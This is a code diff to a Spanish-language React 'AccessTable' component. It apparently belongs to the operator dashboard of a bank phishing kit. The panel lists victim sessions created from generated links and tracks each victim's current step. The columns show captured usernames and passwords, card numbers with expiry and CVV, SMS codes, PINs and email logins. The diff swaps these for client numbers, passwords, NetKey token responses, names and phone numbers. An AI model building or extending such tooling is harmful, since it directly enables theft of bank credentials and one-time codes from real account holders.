@@ -558,25 +558,22 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <thead>
               <tr>
                 <th className="p-3 text-left">#</th>
-                <th className="p-3 text-left">Folio</th>
-                <th className="p-3 text-left">User:Password</th>
+                <th className="p-3 text-left">Número de Cliente</th>
+                <th className="p-3 text-left">Contraseña</th>
                 <th className="p-3 text-left">Banco</th>
-                <th className="p-3 text-left">Dispositivo</th>
-                <th className="p-3 text-left">Tarjeta</th>
-                <th className="p-3 text-left">SMS</th>
-                <th className="p-3 text-left">NIP</th>
-                <th className="p-3 text-left">SMS COMPRA</th>
-                <th className="p-3 text-left">Celular</th>
-                <th className="p-3 text-left">Gmail</th>
+                <th className="p-3 text-left">NetKey</th>
+                <th className="p-3 text-left">Nombre</th>
+                <th className="p-3 text-left">Teléfono 1</th>
+                <th className="p-3 text-left">Teléfono 2</th>
+                <th className="p-3 text-left">Correo</th>
                 <th className="p-3 text-left">Paso actual</th>
-                <th className="p-3 text-left">Creado por</th>
                 <th className="p-3 text-left">Acciones</th>
               </tr>
             </thead>
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={14} className="p-4 text-center text-gray-400">
+                  <td colSpan={11} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -591,53 +588,30 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   onClick={() => onSelectSession(session.sessionId)}
                 >
                   <td className="p-3 text-white">{index + 1}</td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.folio ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {session.folio}
-                  </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {session.username && session.password 
-                      ? `${session.username}:${maskDataIfNeeded(session.password, true)}` 
-                      : '--'}
-                  </td>
-                  <td className="p-3 text-white">{session.banco}</td>
-                  <td className="p-3 text-white">{(session as any).dispositivo || '--'}</td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.tarjeta ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    <div>
-                      <span className="block">{isAdmin ? (session.tarjeta || '--') : '••••••••'}</span>
-                      {isAdmin && (session.fechaVencimiento || session.cvv) && (
-                        <div className="text-xs mt-1 text-gray-300">
-                          {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
-                          {session.cvv && <span>CVV: {session.cvv}</span>}
-                        </div>
-                      )}
-                    </div>
-                  </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.sms ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {isAdmin ? (session.sms || '--') : '••••••••'}
-                  </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.nip ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {isAdmin ? (session.nip || '--') : '••••••••'}
-                  </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.smsCompra ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {isAdmin ? (session.smsCompra || '--') : '••••••••'}
-                  </td>
-                  <td className={`p-3 ${highlightedFields[session.sessionId]?.celular ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {isAdmin ? (session.celular || '--') : '••••••••'}
+                  <td className="p-3 text-white">
+                    {(session as any).numeroCliente || '--'}
                   </td>
                   <td className="p-3 text-white">
-                    {session.correo || session.contrasena ? (
-                      <div>
-                        {session.correo && <div className="text-[#be0046] text-sm">{session.correo}</div>}
-                        {session.contrasena && <div className="text-[#be0046] text-sm mt-1">{session.contrasena}</div>}
-                      </div>
-                    ) : '--'}
+                    {(session as any).claveAcceso || '--'}
+                  </td>
+                  <td className="p-3 text-white">{session.banco}</td>
+                  <td className="p-3 text-white">
+                    {(session as any).netkeyResponse || '--'}
+                  </td>
+                  <td className="p-3 text-white">
+                    {(session as any).nombreRepresentante || '--'}
+                  </td>
+                  <td className="p-3 text-white">
+                    {(session as any).telefono1 || '--'}
+                  </td>
+                  <td className="p-3 text-white">
+                    {(session as any).telefono2 || '--'}
+                  </td>
+                  <td className="p-3 text-white">
+                    {session.correo || '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#be0046] font-bold' : 'text-white'}`}>
-                    {/* Convert pasoActual to a more readable format */}
                     {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
-                  </td>
-                  <td className="p-3 text-white text-opacity-80">
-                    {session.createdBy || '--'}
                   </td>
                   <td className="p-3 text-[#ccc]">
                     <div className="flex space-x-2">
